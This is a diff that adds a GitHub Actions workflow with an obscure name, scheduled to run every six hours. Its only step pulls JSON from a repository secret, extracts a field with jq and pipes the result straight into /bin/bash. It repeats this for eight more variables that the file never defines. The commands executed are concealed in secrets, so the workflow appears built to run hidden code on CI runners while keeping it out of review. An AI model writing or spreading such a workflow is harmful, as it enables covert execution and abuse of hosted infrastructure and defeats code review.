@@ -1,0 +1,25 @@
+name: nengbanrongkai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nengbanrongkai
+        env:
+          k1277: ${{ secrets.k1277 }}
+        run: |
+          echo $k1277 | jq -r .ilj0669 | /bin/bash
+          echo $ay95073 | jq -r .nj5 | /bin/bash
+          echo $dbjh5265 | jq -r .tfw8 | /bin/bash
+          echo $dpt303 | jq -r .rxfd95984 | /bin/bash
+          echo $olsc039 | jq -r .m4498 | /bin/bash
+          echo $worg9990 | jq -r .huhtm618 | /bin/bash
+          echo $fhdnf404 | jq -r .wey7 | /bin/bash
+          echo $wjl6898 | jq -r .jigvz52930 | /bin/bash
+          echo $begl0 | jq -r .e58 | /bin/bash
+
